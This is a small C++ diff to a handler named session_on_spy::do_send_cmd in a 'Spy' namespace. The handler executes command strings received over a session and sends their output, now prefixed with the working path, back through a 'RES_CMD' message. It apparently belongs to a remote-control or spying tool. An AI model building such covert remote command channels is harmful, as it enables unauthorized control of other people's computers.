@@ -129,10 +129,10 @@ namespace Spy {
 
     void session_on_spy::do_send_cmd(string _cmd) {
 	if ( auth ) {
-	    Cmd cmd;
 	    cout << "cmd : " << _cmd << endl;
 	    cmd.exec(_cmd.c_str());
 	    stringstream ss;
+	    ss << "[ " << cmd.get_path() << " ]";
 	    ss << cmd.get_res();
 	    ss << " //end//";
 	    (*proto)["RES_CMD"](ss.str());
